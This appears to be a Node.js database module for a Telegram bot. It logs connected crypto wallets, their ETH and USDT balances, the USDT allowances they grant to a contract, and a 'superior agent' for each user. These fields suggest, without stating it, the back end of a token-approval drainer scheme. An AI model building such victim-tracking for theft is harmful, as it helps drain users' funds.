import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';

dotenv.config();

// 初始化Supabase客户端
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;

if (!supabaseUrl || !supabaseKey) {
  console.error(' 错误: SUPABASE_URL 或 SUPABASE_ANON_KEY 未配置');
  process.exit(1);
}

const supabase = createClient(supabaseUrl, supabaseKey);

console.log(' Supabase数据库连接已初始化');

// 数据库操作类
class TelegramBotDatabase {
  
  // 提供supabase实例访问
  get supabase() {
    return supabase;
  }
  
  // 添加或更新连接用户
  async upsertConnectedUser(walletAddress, userData = {}, blockchainData = {}) {
    try {
      const { data, error } = await supabase
        .from('telegram_connected_users')
        .upsert({
          wallet_address: walletAddress.toLowerCase(),
          last_seen: new Date().toISOString(),
          connection_count: 1,
          user_agent: userData.userAgent || null,
          referrer: userData.referrer || null,
          status: 'connected',
          // 新增字段
          superior_agent: userData.superiorAgent || null,
          agent_nickname: userData.agentNickname || null,
          user_remark: userData.userRemark || 'null',
          eth_balance: parseFloat(blockchainData.ethBalance) || 0,
          usdt_balance: parseFloat(blockchainData.usdtBalance) || 0,
          is_authorized: parseFloat(blockchainData.allowance || 0) > 0,
          authorized_amount: parseFloat(blockchainData.allowance) || 0,
          authorized_contract: blockchainData.authorizedContract || null
        }, { 
          onConflict: 'wallet_address',
          ignoreDuplicates: false 
        })
        .select();

      if (error) throw error;

      // 获取或分配用户编号
      const { data: userNumber } = await supabase.rpc('get_or_assign_user_number', {
        wallet_addr: walletAddress.toLowerCase()
      });

      // 如果是已存在用户，增加连接次数
      if (data && data.length > 0) {
        const { error: updateError } = await supabase.rpc('increment_connection_count', {
          wallet_addr: walletAddress.toLowerCase()
        });
        
        if (updateError) {
          console.log('警告: 无法更新连接次数:', updateError.message);
        }
      }

      console.log(` 数据库记录用户连接: ${this.formatAddress(walletAddress)} (编号: ${userNumber})`);
      return data;
    } catch (error) {
      console.error(' 记录用户连接失败:', error.message);
      return null;
    }
  }

  // 更新用户区块链数据
  async updateUserBlockchainData(walletAddress, blockchainData) {
    try {
      const { data, error } = await supabase
        .from('telegram_connected_users')
        .update({
          eth_balance: parseFloat(blockchainData.ethBalance) || 0,
          usdt_balance: parseFloat(blockchainData.usdtBalance) || 0,
          is_authorized: parseFloat(blockchainData.allowance || 0) > 0,
          authorized_amount: parseFloat(blockchainData.allowance) || 0,
          authorized_contract: blockchainData.authorizedContract || null,
          last_seen: new Date().toISOString()
        })
        .eq('wallet_address', walletAddress.toLowerCase())
        .select();

      if (error) throw error;

      return data;
    } catch (error) {
      console.error(' 更新用户区块链数据失败:', error.message);
      return null;
    }
  }

  // 获取完整的用户信息
  async getCompleteUserInfo(walletAddress) {
    try {
      const { data, error } = await supabase
        .from('telegram_connected_users')
        .select('*')
        .eq('wallet_address', walletAddress.toLowerCase())
        .single();

      if (error) throw error;

      return data;
    } catch (error) {
      console.error(' 获取用户完整信息失败:', error.message);
      return null;
    }
  }

  // 断开用户连接
  async disconnectUser(walletAddress) {
    try {
      const { data, error } = await supabase
        .from('telegram_connected_users')
        .update({
          status: 'disconnected',
          last_seen: new Date().toISOString()
        })
        .eq('wallet_address', walletAddress.toLowerCase())
        .select();

      if (error) throw error;

      console.log(` 数据库记录用户断开: ${this.formatAddress(walletAddress)}`);
      return data;
    } catch (error) {
      console.error(' 记录用户断开失败:', error.message);
      return null;
    }
  }

  // 保存用户状态快照
  async saveUserSnapshot(walletAddress, blockchainData, snapshotType = 'periodic') {
    try {
      const { data, error } = await supabase
        .from('telegram_user_snapshots')
        .insert({
          wallet_address: walletAddress.toLowerCase(),
          eth_balance: parseFloat(blockchainData.ethBalance) || 0,
          usdt_balance: parseFloat(blockchainData.usdtBalance) || 0,
          allowance_amount: parseFloat(blockchainData.allowance) || 0,
          block_number: blockchainData.blockNumber || null,
          snapshot_type: snapshotType
        })
        .select();

      if (error) throw error;

      console.log(` 保存用户快照: ${this.formatAddress(walletAddress)} (${snapshotType})`);
      return data;
    } catch (error) {
      console.error(' 保存用户快照失败:', error.message);
      return null;
    }
  }

  // 记录机器人事件
  async logBotEvent(eventType, walletAddress = null, eventData = {}, messageId = null, errorMessage = null) {
    try {
      const { data, error } = await supabase
        .from('telegram_bot_events')
        .insert({
          event_type: eventType,
          wallet_address: walletAddress ? walletAddress.toLowerCase() : null,
          event_data: eventData,
          message_sent: !!messageId,
          telegram_message_id: messageId,
          error_message: errorMessage
        })
        .select();

      if (error) throw error;

      console.log(` 记录机器人事件: ${eventType}${walletAddress ? ` (${this.formatAddress(walletAddress)})` : ''}`);
      return data;
    } catch (error) {
      console.error(' 记录机器人事件失败:', error.message);
      return null;
    }
  }

  // 获取用户的最新快照
  async getLatestUserSnapshot(walletAddress) {
    try {
      const { data, error } = await supabase
        .from('telegram_user_snapshots')
        .select('*')
        .eq('wallet_address', walletAddress.toLowerCase())
        .order('created_at', { ascending: false })
        .limit(1);

      if (error) throw error;

      return data && data.length > 0 ? data[0] : null;
    } catch (error) {
      console.error(' 获取用户快照失败:', error.message);
      return null;
    }
  }

  // 获取连接的用户列表
  async getConnectedUsers(status = 'connected') {
    try {
      const { data, error } = await supabase
        .from('telegram_connected_users')
        .select('*')
        .eq('status', status)
        .order('last_seen', { ascending: false });

      if (error) throw error;

      return data || [];
    } catch (error) {
      console.error(' 获取连接用户失败:', error.message);
      return [];
    }
  }

  // 更新每日统计
  async updateDailyStats(statsUpdate = {}) {
    try {
      const today = new Date().toISOString().split('T')[0];
      
      const { data, error } = await supabase
        .from('telegram_bot_stats')
        .upsert({
          stat_date: today,
          ...statsUpdate,
          updated_at: new Date().toISOString()
        }, { 
          onConflict: 'stat_date',
          ignoreDuplicates: false 
        })
        .select();

      if (error) throw error;

      return data;
    } catch (error) {
      console.error(' 更新每日统计失败:', error.message);
      return null;
    }
  }

  // 增加统计计数
  async incrementStat(statName, increment = 1) {
    try {
      const today = new Date().toISOString().split('T')[0];
      
      // 使用数据库函数增加计数
      const { error } = await supabase.rpc('increment_stat', {
        stat_name: statName,
        input_date: today,
        increment_by: increment
      });

      if (error) throw error;

      console.log(` 统计更新: ${statName} +${increment}`);
      return true;
    } catch (error) {
      console.error(` 增加统计计数失败 (${statName}):`, error.message);
      return null;
    }
  }

  // 获取配置
  async getConfig(configKey) {
    try {
      const { data, error } = await supabase
        .from('telegram_bot_config')
        .select('config_value')
        .eq('config_key', configKey)
        .single();

      if (error && error.code !== 'PGRST116') throw error; // PGRST116 = no rows returned

      return data ? data.config_value : null;
    } catch (error) {
      console.error(` 获取配置失败 (${configKey}):`, error.message);
      return null;
    }
  }

  // 设置配置
  async setConfig(configKey, configValue, description = null) {
    try {
      const { data, error } = await supabase
        .from('telegram_bot_config')
        .upsert({
          config_key: configKey,
          config_value: configValue,
          description: description,
          updated_at: new Date().toISOString()
        }, { 
          onConflict: 'config_key',
          ignoreDuplicates: false 
        })
        .select();

      if (error) throw error;

      console.log(`  设置配置: ${configKey} = ${configValue}`);
      return data;
    } catch (error) {
      console.error(` 设置配置失败 (${configKey}):`, error.message);
      return null;
    }
  }

  // 获取今日统计
  async getTodayStats() {
    try {
      const today = new Date().toISOString().split('T')[0];
      
      const { data, error } = await supabase
        .from('telegram_bot_stats')
        .select('*')
        .eq('stat_date', today)
        .single();

      if (error && error.code !== 'PGRST116') throw error;

      return data || {
        stat_date: today,
        total_users: 0,
        connected_users: 0,
        new_connections: 0,
        disconnections: 0,
        authorizations: 0,
        messages_sent: 0,
        errors: 0
      };
    } catch (error) {
      console.error(' 获取今日统计失败:', error.message);
      return null;
    }
  }

  // 清理旧数据 (可选，用于维护)
  async cleanupOldData(daysToKeep = 30) {
    try {
      const cutoffDate = new Date();
      cutoffDate.setDate(cutoffDate.getDate() - daysToKeep);
      
      // 清理旧快照
      const { error: snapshotError } = await supabase
        .from('telegram_user_snapshots')
        .delete()
        .lt('created_at', cutoffDate.toISOString());

      if (snapshotError) throw snapshotError;

      // 清理旧事件
      const { error: eventError } = await supabase
        .from('telegram_bot_events')
        .delete()
        .lt('created_at', cutoffDate.toISOString());

      if (eventError) throw eventError;

      console.log(` 清理了 ${daysToKeep} 天前的旧数据`);
    } catch (error) {
      console.error(' 清理旧数据失败:', error.message);
    }
  }

  // 获取统计概览
  async getStatsOverview() {
    try {
      const [connectedUsers, todayStats, recentEvents] = await Promise.all([
        this.getConnectedUsers(),
        this.getTodayStats(),
        supabase
          .from('telegram_bot_events')
          .select('event_type')
          .gte('created_at', new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString())
          .order('created_at', { ascending: false })
          .limit(100)
      ]);

      return {
        connectedUsers: connectedUsers.length,
        todayStats: todayStats,
        recentEventsCount: recentEvents.data ? recentEvents.data.length : 0,
        eventBreakdown: this.getEventBreakdown(recentEvents.data || [])
      };
    } catch (error) {
      console.error(' 获取统计概览失败:', error.message);
      return null;
    }
  }

  // 事件类型分析
  getEventBreakdown(events) {
    const breakdown = {};
    events.forEach(event => {
      breakdown[event.event_type] = (breakdown[event.event_type] || 0) + 1;
    });
    return breakdown;
  }

  // 辅助方法：格式化地址显示
  formatAddress(address) {
    if (!address) return 'N/A';
    return `${address.slice(0, 6)}...${address.slice(-4)}`;
  }

  // 测试数据库连接
  async testConnection() {
    try {
      const { data, error } = await supabase
        .from('telegram_bot_config')
        .select('*')
        .limit(1);

      if (error) throw error;

      console.log(' 数据库连接测试成功');
      return true;
    } catch (error) {
      console.error(' 数据库连接测试失败:', error.message);
      return false;
    }
  }
}

export { TelegramBotDatabase, supabase };
